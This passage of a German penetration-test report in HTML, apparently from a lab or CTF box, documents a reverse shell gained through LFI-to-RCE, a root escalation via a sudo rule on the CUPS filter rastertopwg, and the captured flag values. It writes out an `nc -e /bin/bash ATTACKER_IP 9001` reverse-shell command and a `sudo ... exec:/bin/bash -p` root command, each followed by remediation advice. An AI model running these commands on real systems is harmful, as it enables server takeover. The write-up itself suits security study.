+                3. RCE testen: `CHAIN_URL&cmd=id` aufrufen -> Ausgabe `uid=33(www-data)...` erscheint.
+                4. Reverse Shell starten: Listener aufsetzen (`nc -lvnp 9001`), dann `CHAIN_URL&cmd=nc%20-e%20/bin/bash%20ATTACKER_IP%209001` aufrufen.
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Angreifer erhält eine Reverse Shell als Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. LFI ermöglicht das Auslesen sensibler Daten. Die Eskalation zu RCE ermöglicht die vollständige Übernahme des Webserver-Prozesses und dient als Ausgangspunkt für weitere Angriffe.<br/><strong>Empfehlungen:</strong> LFI durch sichere Programmierung (Input-Validierung, Whitelisting) beheben. PHP-Filter und gefährliche Wrapper wenn möglich deaktivieren. Web Application Firewall (WAF) einsetzen.</p>
+        </section>
+
+        <section id="poc-root-cups">
+            <h2>Proof of Concept: Root via CUPS Filter Sudo</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Nach Erlangung von Zugriffsrechten als Benutzer `kierra` (über eine Passwort-Offenlegung in Logs und eine Backdoor auf Port 1001) wurde mittels `sudo -l` festgestellt, dass `kierra` den CUPS-Filter `/usr/lib/cups/filter/rastertopwg` als beliebiger Benutzer, einschließlich `root`, ausführen darf. Dieser Filter weist eine Schwachstelle oder ein undokumentiertes Feature auf, das die Ausführung von Befehlen über speziell formatierte Argumente (`exec:COMMAND`) erlaubt.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff als Benutzer `kierra`, unsichere `sudo`-Regel für `rastertopwg`.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Als Benutzer `kierra` anmelden.
+                2. Überprüfen der `sudo`-Rechte: `sudo -l` -> Zeigt `(ALL : ALL) /usr/lib/cups/filter/rastertopwg`.
+                3. Root-Shell mittels `sudo` und Filter-Exploit erhalten: `sudo -u root /usr/lib/cups/filter/rastertopwg exec:/bin/bash -p`.
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Befehl startet eine interaktive Shell mit Root-Rechten.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Kritisch. Eine unsichere `sudo`-Regel ermöglicht die direkte Eskalation zu Root-Rechten.<br/><strong>Empfehlungen:</strong> Die `sudo`-Regel für `kierra` und `rastertopwg` muss sofort entfernt oder stark eingeschränkt werden (z.B. nur Ausführung als spezifischer, unprivilegierter Benutzer erlauben, falls notwendig). Prinzip der geringsten Rechte anwenden. `sudo`-Regeln regelmäßig überprüfen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/kierra/user.txt</div>
+                     <div class="flag-value"><span class="password">63e2f2ec7e3dbae87afc4e0e86d0867b</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <!-- Pfad angepasst basierend auf Befehl im Text -->
+                     <div class="flag-command">cat /root/root_flag.txt</div>
+                     <div class="flag-value"><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 22. Mai 2023</p>
+    </footer>
+</body>
+</html>
